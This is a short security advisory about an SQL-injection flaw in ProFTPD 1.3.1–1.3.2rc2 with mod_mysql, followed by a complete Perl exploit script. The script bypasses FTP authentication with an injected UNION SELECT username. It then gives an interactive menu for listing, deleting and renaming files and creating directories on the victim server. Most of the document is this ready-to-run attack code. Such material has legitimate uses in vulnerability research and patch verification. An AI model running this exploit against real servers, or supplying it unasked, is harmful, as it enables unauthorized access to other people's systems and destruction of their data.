source: http://www.securityfocus.com/bid/33722/info

ProFTPD is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to manipulate SQL queries, modify data, or exploit latent vulnerabilities in the underlying database. This may result in unauthorized access and a compromise of the application; other attacks are also possible.

ProFTPD 1.3.1 through 1.3.2 rc 2 are vulnerable.

# Credits Go For gat3way For Finding The Bug ! [AT] http://milw0rm.com/exploits/8037
# Exploited By AlpHaNiX 
# HomePage NullArea.Net
# Greetz For Zigma-Djekmani-r1z

use Net::FTP;

if (@ARGV < 1 ) { print"\n\n\n[+] Usage : ".
                                      "\n\n[+] ./exploit.pl ftp.example.com \n\n" ; exit();}
$host = $ARGV[0]; 
system("cls") ;
                  print "----------------------------------------------------------\n".
                        "[+] ProFTPd with mod_mysql Authentication Bypass Exploit \n".
                        "[+] Credits Go For gat3way For Finding The Bug !\n".
                                                "[+] Exploited By AlpHaNiX \n".
                                                "[+] NullArea.Net\n".
                        "----------------------------------------------------------\n"."\n[!] Attacking $host ..." ;
$user = "USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --";
$pass = '1';

$ftp = Net::FTP->new("$host", Debug => 0) or die "[!] Cannot connect to $host";
$ftp->login("$user","$pass") or die "\n\n[!] Couldn't ByPass The authentication ! ", $ftp->message;
print "\n[*] Connected To $host";

print "\n[!] Please Choose A Command To Execute On $host :\n" ;
print "\n\n\n[1] Show Files\n" ;
print "[2] Delete File\n";
print "[3] Rename File or Dir\n";
print "[4] Create A Directory\n";
print "[5] Exit\n";
print "Enter Number Of Command Here => " ;
my $command = <STDIN> ;
chomp $command ;

if ($command==1){&Show}
if ($command==2){&Delete}
if ($command==3){&rename}
if ($command==4){&create_dir}
if ($command==5){&EXIT}
if ($command =! 1||2||3||4||5) {print "\n[!] Not Valid Choise ! Closing..." ;exit()}

 sub Show
{
print "\n\n\n[!] Please Specify a directory\n";
my $dir = <STDIN> ;
chomp $dir ;
$ftp->cwd($dir) or $newerr=1; 
  push @ERRORS, "Can't cd  $!\n" if $newerr;
  myerr() if $newerr;
  $ftp->quit if $newerr;

  @files=$ftp->dir or $newerr=1;
  push @ERRORS, "Can't get file list $!\n" if $newerr;
  myerr() if $newerr;
print "Got  file list\n";   
foreach(@files) {
  print "$_\n";
 
  }
   exit();
}

 sub Delete
{
print "\n\n\n[!] Please Specify a File To Delete\n";
my $file = <STDIN> ;
chomp $file ;
$ftp->delete($file) or die "\n[!] Error while Deleting $file => " , $ftp->message ;
print "\n[!] $file Deleted !";
}

 sub rename
{
print "\n\n\n[!] Please Specify a File To Rename\n";
my $file = <STDIN> ;
chomp $file ;
print "\n[!] Please Specify a New Name For $file\n";
my $name = <STDIN> ;
chomp $name ;
$ftp->rename($file,$name) or die "\n[!] Error while Renaming $file => " , $ftp->message ;
print "\n[!] $file Renamed to $name !";
}


 sub create_dir
{
print "\n\n\n[!] Please Specify a Directory Name To create\n";
my $dir = <STDIN> ;
chomp $dir ;
$ftp->mkdir($dir) or die "\n[!] Error while creating $dir => " , $ftp->message ;
print "\n[!] $dir Created !";
}

 sub EXIT
{
system("cls");
$ftp->quit;
exit();
}
